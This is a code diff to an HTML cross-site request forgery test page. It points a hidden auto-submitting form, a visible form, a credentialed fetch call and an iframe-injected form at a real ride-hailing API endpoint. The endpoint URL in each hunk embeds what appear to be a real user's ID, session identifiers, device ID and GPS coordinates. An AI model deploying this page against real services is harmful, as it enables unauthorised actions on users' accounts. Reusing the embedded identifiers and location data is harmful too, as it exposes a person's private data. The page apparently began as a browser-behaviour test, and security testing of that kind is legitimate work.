@@ -58,7 +58,7 @@
         <div class="test-section">
             <h2>Test 1: Silent Form Submission (Classic CSRF)</h2>
             <p>Tests if browser automatically includes Basic Auth headers</p>
-            <form id="silentForm" method="POST" action="https://user.live.net/api/endpoint" style="display:none;">
+            <form id="silentForm" method="POST" action="https://node.bolt.eu/user/user/setDeviceToken?version=CA.173.0&deviceId=dr_QnVbyRRCAfhyLBwzYoQ&device_name=samsungSM-G950F&device_os_version=9&channel=googleplay&brand=bolt&deviceType=android&signup_session_id&country=ee&is_local_authentication_available=true&language=en-GB&gps_lat=30.054896&gps_lng=31.428141&gps_accuracy_m=19.067&gps_age=7&user_id=269128802&session_id=269128802u1755828014758&distinct_id=client-269128802&rh_session_id=269128802u1755828014" style="display:none;">
                 <input type="hidden" name="action" value="test_csrf">
                 <input type="hidden" name="timestamp" value="">
             </form>
@@ -69,7 +69,7 @@
         <div class="test-section">
             <h2>Test 2: Visible Form (User Interaction)</h2>
             <p>Shows the form - if browser prompts for auth, it's vulnerable</p>
-            <form id="visibleForm" method="POST" action="https://user.live.net/api/endpoint">
+            <form id="visibleForm" method="POST" action="https://node.bolt.eu/user/user/setDeviceToken?version=CA.173.0&deviceId=dr_QnVbyRRCAfhyLBwzYoQ&device_name=samsungSM-G950F&device_os_version=9&channel=googleplay&brand=bolt&deviceType=android&signup_session_id&country=ee&is_local_authentication_available=true&language=en-GB&gps_lat=30.054896&gps_lng=31.428141&gps_accuracy_m=19.067&gps_age=7&user_id=269128802&session_id=269128802u1755828014758&distinct_id=client-269128802&rh_session_id=269128802u1755828014">
                 <input type="hidden" name="action" value="test_csrf_visible">
                 <input type="hidden" name="timestamp" value="">
                 <button type="submit">Submit Test Request</button>
@@ -184,7 +184,7 @@
             try {
                 resultDiv.innerHTML = '<div class="warning">Testing fetch with credentials...</div>';
                 
-                const response = await fetch('https://user.live.net/api/endpoint', {
+                const response = await fetch('https://node.bolt.eu/user/user/setDeviceToken?version=CA.173.0&deviceId=dr_QnVbyRRCAfhyLBwzYoQ&device_name=samsungSM-G950F&device_os_version=9&channel=googleplay&brand=bolt&deviceType=android&signup_session_id&country=ee&is_local_authentication_available=true&language=en-GB&gps_lat=30.054896&gps_lng=31.428141&gps_accuracy_m=19.067&gps_age=7&user_id=269128802&session_id=269128802u1755828014758&distinct_id=client-269128802&rh_session_id=269128802u1755828014', {
                     method: 'POST',
                     credentials: 'include', // Include cookies and basic auth
                     headers: {
@@ -241,7 +241,7 @@
             const formHTML = `
                 <html>
                 <body>
-                <form id="csrfForm" method="POST" action="https://user.live.net/api/endpoint">
+                <form id="csrfForm" method="POST" action="https://node.bolt.eu/user/user/setDeviceToken?version=CA.173.0&deviceId=dr_QnVbyRRCAfhyLBwzYoQ&device_name=samsungSM-G950F&device_os_version=9&channel=googleplay&brand=bolt&deviceType=android&signup_session_id&country=ee&is_local_authentication_available=true&language=en-GB&gps_lat=30.054896&gps_lng=31.428141&gps_accuracy_m=19.067&gps_age=7&user_id=269128802&session_id=269128802u1755828014758&distinct_id=client-269128802&rh_session_id=269128802u1755828014">
                     <input type="hidden" name="action" value="iframe_test">
                     <input type="hidden" name="timestamp" value="${new Date().toISOString()}">
                 </form>
@@ -295,3 +295,4 @@
     </script>
 </body>
 </html>
+
